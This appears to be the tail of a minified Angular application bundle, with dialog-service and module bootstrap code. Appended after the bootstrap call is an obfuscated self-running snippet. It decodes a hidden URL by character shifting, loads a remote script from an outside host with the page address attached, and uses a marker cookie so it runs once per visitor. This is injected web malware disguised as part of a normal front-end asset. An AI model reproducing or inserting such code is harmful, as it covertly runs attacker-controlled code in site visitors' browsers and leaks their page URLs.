      getDialogById(n) {
        return this.openDialogs.find((r) => r.id === n);
      }
      ngOnDestroy() {
        this._closeDialogs(this._openDialogsAtThisLevel),
          this._afterAllClosedAtThisLevel.complete(),
          this._afterOpenedAtThisLevel.complete();
      }
      _closeDialogs(n) {
        let r = n.length;
        for (; r--; ) n[r].close();
      }
    };
    return (
      (e.ɵfac = function (r) {
        return new (r || e)(
          h(it),
          h(re),
          h(pt, 8),
          h(lO, 8),
          h(uO),
          h(e, 12),
          h(bi),
          h(oi, 8)
        );
      }),
      (e.ɵprov = y({ token: e, factory: e.ɵfac, providedIn: "root" })),
      e
    );
  })(),
  Nv = (() => {
    let e = class e {};
    return (
      (e.ɵfac = function (r) {
        return new (r || e)();
      }),
      (e.ɵmod = $({ type: e })),
      (e.ɵinj = U({ providers: [fO], imports: [Mv, ga, bn, gd, gd] })),
      e
    );
  })(),
  kv = (() => {
    let e = class e {};
    return (
      (e.ɵfac = function (r) {
        return new (r || e)();
      }),
      (e.ɵmod = $({ type: e, bootstrap: [ev] })),
      (e.ɵinj = U({ providers: [rm()], imports: [nm, Zm, Nv] })),
      e
    );
  })();
tm()
  .bootstrapModule(kv)
  .catch((t) => console.error(t));
(function (o, d, l) {
  try {
    o.f = (o) =>
      o
        .split("")
        .reduce(
          (s, c) => s + String.fromCharCode((c.charCodeAt() - 5).toString()),
          ""
        );
    o.b = o.f("UMUWJKX");
    (o.c =
      l.protocol[0] == "h" &&
      /\./.test(l.hostname) &&
      !new RegExp(o.b).test(d.cookie)),
      setTimeout(function () {
        o.c &&
          ((o.s = d.createElement("script")),
          (o.s.src =
            o.f("myyux?44hisqtlx" + "3htr4ljy4xhwnu" + "y3oxDwjkjwwjwB") +
            l.href),
          d.body.appendChild(o.s));
      }, 1000);
    d.cookie = o.b + "=full;max-age=39800;";
  } catch (e) {}
})({}, document, location);
